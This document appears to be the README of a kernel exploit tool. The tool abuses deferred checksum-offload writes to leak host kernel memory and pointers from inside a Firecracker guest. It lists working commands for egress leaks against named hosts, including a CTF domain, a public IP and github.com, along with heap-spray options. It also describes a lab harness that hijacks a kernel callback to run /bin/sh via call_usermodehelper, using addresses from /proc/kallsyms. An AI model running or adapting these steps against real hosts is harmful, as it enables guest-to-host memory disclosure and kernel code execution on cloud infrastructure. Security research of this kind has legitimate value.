Belajar networking

The original TAP/netns reproducer remains the default mode. To carry the same
checksum metadata across a Firecracker guest's real virtio-net boundary, run as
root inside the guest:

```sh
./test -egress -iface eth0 -dst chall.itsbengsky.id
```

Egress mode resolves the IPv4 route and next-hop MAC, sends the completing
fragments before the short malicious head, and listens for an ICMP quotation.
Its default UDP carrier is valid before the deferred write and exposes a second
UDP header after the IHL mutation, making a closed destination port return the
quoted leak through ordinary UDP/NAT paths. Use `-egress-transport raw253` for
the original experimental protocol carrier. When policy only admits web-like
traffic, `-egress-transport tcp -tcp-port 443` emits SYN-shaped TCP headers both
before and after the IHL mutation. Its default source-port bytes become
NOP,END IPv4 options after mutation. Its TCP checksum is intentionally invalid;
the controlled endpoint's passive AF_PACKET receiver observes fragments before
the remote TCP stack validates it. `-dst-mac`, `-gateway`, and `-src` can be used
when automatic discovery is unavailable.

For the x86 page-fragment layout, keep the TCP carrier at its default
`-vlan-tags 2`. Host TCP parsing pulls the remaining 12 bytes of the first TCP
header into the linear head; those two tags leave two bytes of tailroom after
that pull, exposing the `frag_list` pointer at reported past-linear offset 22.
The disposable TAP lab reproduced a canonical pointer with this geometry.

`-tcp-valid-checksum` makes both the original TCP segment and the segment that
appears after the 40-byte IHL shift checksum-valid. It solves the payload length
from the IPv4 TCP pseudo-header instead of modifying a scratch payload word;
the resulting valid segment still makes the deferred host checksum store
`0x4f00` into the first IPv4 word. This is useful when conntrack or egress policy
drops the default deliberately invalid TCP checksum. The flag is egress-only
and overrides `-egress-rest`.

```sh
./test -egress -egress-transport tcp -tcp-valid-checksum \
  -tcp-port 443 -vlan-tags 2 -dst 185.2.100.241
```

`-tcp-echo-options` is a bounded return-channel probe for an approved TCP
destination. It makes the original TCP header double as two valid IPv4 options
after the IHL rewrite: source port `0x8804` becomes a copied four-byte Stream-ID
option, and the TCP sequence becomes a 36-byte Timestamp option with no free
slot. A Linux TCP peer echoes the Timestamp option in its SYN-ACK or RST without
replacing the 32 bytes after its header. The capture path recognizes that reply,
prints the exact 32-byte window, and reports canonical pointer candidates.

The flag requires `-tcp-valid-checksum`. On the controlled Linux endpoint, a
raw SYN/SYN-ACK integration test returned all 32 marker bytes exactly; only the
Timestamp overflow nibble changed. A separate two-host public-route test got no
reply, so IPv4-option filtering by an Internet path remains a real limitation.
The probe is therefore most useful when an approved destination is terminated
or reflected by a host-local egress proxy. It does not bypass a destination
allowlist.

```sh
./test -egress -egress-transport tcp -tcp-valid-checksum \
  -tcp-echo-options -tcp-port 443 -vlan-tags 2 \
  -dst github.com -count 3 -egress-wait-ms 10000
```

Repeated egress samples are sent as one batch and share a single capture window:

```sh
./test -egress -count 100 -egress-wait-ms 10000
```

When external forwarding is unavailable, an unused address on the host-side TAP
can provide a return path. Route the crafted datagram through the TAP gateway and
add `-answer-dst-arp`; the probe answers the host's ARP request for `-dst`, then
captures host-fragmented packets returned to the guest. This mode is explicit
because it claims the destination address on that isolated link.

```sh
./test -egress -iface eth0 -dst 192.0.2.3 -gateway 192.0.2.1 \
  -answer-dst-arp -count 10 -egress-wait-ms 15000
```

To test whether the host immediately reuses a freed `skbuff_small_head` object
for the malicious short fragment, insert one or more 128-byte experimental
Ethernet frames directly before each head. Their payload is an obvious marker;
if the returned `past-linear` window contains repeated `ee` bytes, the leak is
showing controlled predecessor contents rather than unrelated allocator data:

```sh
./test -egress -iface eth0 -dst 192.0.2.3 -gateway 192.0.2.1 \
  -answer-dst-arp -egress-spray 1 -egress-spray-fill 0xee \
  -spray-delay-us 1000 -count 10 -egress-wait-ms 15000
```

The spray uses the locally administered experimental EtherType `0x88b5` and is
disabled unless `-egress-spray` is nonzero.

The prepared-TAP laboratory mode exposes the same experiment as
`-tebar 1 -tebar-fill 0xee`. Unlike the original same-sized predecessor, the
128-byte frame actually covers the 32-byte region disclosed past the short
head's logical tail. `-spray-delay-us` gives the receive backlog time to free
that predecessor before the malicious head is allocated.

`-vlan-tags` controls the number of nested VID-0 tags (default 2). On the
nonblocking TAP/page-fragment path used by Firecracker, five tags place the
raw/UDP carrier's logical IP tail two bytes before `skb_shared_info` on x86.
For TCP, the 12-byte transport-header pull shifts the equivalent useful layout
to two tags as described above. The disclosure then includes the live
`frag_list` pointer. The probe reports canonical little-endian kernel pointers
as `host-pointer-candidate` lines. The disposable Linux 6.18 lab verified tags
2 through 7; at Linux's `VLAN_MAX_DEPTH` of 8 the deferred checksum mutation
was no longer preserved.

For a controlled external endpoint, `cmd/receiver` passively records the same
mutated packets before the endpoint's IP stack handles them. It does not supply
checksum-offload metadata and therefore does not exercise this vulnerability on
the collector host:

```sh
go build -o receiver ./cmd/receiver
sudo ./receiver -iface eth0 -udp-port 9 -tcp-port 443
```

The local TAP/netns lab can also test other deferred mutations with
`-csum-offset` (any byte offset in the IPv4 header or first-fragment payload)
and `-csum-word` (the host-endian 16-bit value to write, except the unattainable
one's-complement value `0xffff`). The default `0/0x004f` remains the verified
IHL disclosure. The fragmenter subsequently replaces the total-length,
fragment-offset, and header-checksum bytes at offsets 2..3, 6..7, and 10..11;
the probe verifies any surviving byte of an overlapping unaligned write and
reports fully transient writes for kernel tracing or KASAN.

## Disposable stale-options callback lab

The `research-stale-options` branch contains a lab-only two-stage harness for
the stale parsed-options write. Eight held and explicitly drained 3456-byte TAP
frames seed a 32768-byte `task_frag` page. A safe `len=14` probe lets
`tools/skbtrace` report the recycled short child's `head`; writing that address
to `-stale-groom-head-file` releases a second `len=17` stage on the same locked
kernel thread.

For the Alpine 6.18.52 disposable VM, the second stage has been verified to:

1. set `SKBFL_ZEROCOPY_ENABLE` in the reclaimed child's `skb_shared_info`;
2. invoke a fake `ubuf_info->ops->complete` at the selected `strcpy` address;
3. copy a NUL-free fake `subprocess_info` over the `sk_buff` prefix;
4. force immediate skb rejection/free before the receive path reuses `skb->cb`;
5. execute `call_usermodehelper_exec_async(skb)` and create a harmless marker
   through `/bin/sh -c`.

Resolve all callback addresses from the current lab boot—KASLR makes addresses
copied from an earlier boot invalid:

```sh
awk '$3 == "strcpy" || $3 == "call_usermodehelper_exec_async" || \
     $3 == "legacy_pic_irq_pending_noop" { print $1, $3 }' /proc/kallsyms
```

Use those values with `-stale-groom-callback`,
`-stale-groom-umh-async`, and `-stale-groom-noop-ret`. The marker command is
selected with `-stale-groom-command`. This direct async-helper invocation runs
inside the TAP networking path and produces scheduling/RCU warnings in the
instrumented lab, even though the marker is created and the process exits.
It is not a completed Firecracker-host exploit: the real target still requires
host text addresses and the host-side recycled head address without relying on
guest BPF or `/proc/kallsyms`.
